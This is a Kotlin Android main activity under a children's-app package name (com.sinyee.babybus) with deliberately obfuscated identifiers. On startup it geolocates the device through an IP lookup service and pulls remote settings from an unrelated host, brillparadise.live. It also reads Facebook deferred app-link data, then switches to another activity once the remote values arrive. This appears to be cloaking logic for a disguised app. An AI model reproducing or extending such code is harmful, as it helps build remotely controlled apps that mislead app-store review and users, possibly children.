package com.sinyee.babybus

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.sinyee.babybus.databinding.ActivityMainBinding
import com.sinyee.babybus.vfiuoc.Btsxokzzsd.Companion.okcvkco
import com.sinyee.babybus.vfiuoc.Btsxokzzsd.Companion.bovk
import com.sinyee.babybus.vfiuoc.Btsxokzzsd.Companion.gokvc
import com.sinyee.babybus.vfiuoc.Btsxokzzsd.Companion.wosk
import com.sinyee.babybus.vfiuoc.Btsxokzzsd.Companion.gokv
import com.sinyee.babybus.qwsd.Dosiasodks
import com.sinyee.babybus.qwsd.Reosiokxsad
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private lateinit var foiiorodisi: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        foiiorodisi = ActivityMainBinding.inflate(layoutInflater)
        setContentView(foiiorodisi.root)

        eokokdok(this)

        val doeoaso = Executors.newSingleThreadScheduledExecutor()
        var ovocicicvco: String? = Hawk.get(bovk, null)
        var eiji: String? = Hawk.get(okcvkco, null)
        doeoaso.scheduleAtFixedRate({
            if (ovocicicvco != null && eiji != null) {
                doeoaso.shutdown()
                qossiisjddjx()
            } else {
                ovocicicvco = Hawk.get(bovk)
                eiji = Hawk.get(okcvkco)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch (Dispatchers.IO){
            cxvjijc
        }
    }

    private val cxvjijc: Job = GlobalScope.launch (Dispatchers.IO){
        voockbkof()
        rokdijs()
    }

    private suspend fun rokdijs() {
        val vookfmodsk = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://brillparadise.live/")
            .build()
            .create(Dosiasodks::class.java)
        val oddsdsjidis = vookfmodsk.gpfokg().body()?.eooskdkosa.toString()
        val ixjcjicx = vookfmodsk.gpfokg().body()?.pokxocx.toString()
        val qoksod = vookfmodsk.gpfokg().body()?.xpzokxcji.toString()


        Hawk.put(gokv, oddsdsjidis)
        Hawk.put(wosk, ixjcjicx)
        Hawk.put(okcvkco, qoksod)

    }



    private suspend fun voockbkof() {
        val eokjirkodfok = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(Dosiasodks::class.java)
        val xijcisjasijc = eokjirkodfok.woksd().body()?.sokd
        Log.d("Data from API", xijcisjasijc.toString())

        Hawk.put(bovk, xijcisjasijc)
    }

    private fun qossiisjddjx() {
        val idfjisdjfjisd = Intent(this@MainActivity, Reosiokxsad::class.java)
        startActivity(idfjisdjfjisd)
        finish()
    }





    fun eokokdok(frpodosp: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            frpodosp
        ) { doeopsldps: AppLinkData? ->
            doeopsldps?.let {
                val xziis = doeopsldps.targetUri.host.toString()
                Hawk.put(gokvc, xziis)
            }
        }
    }
}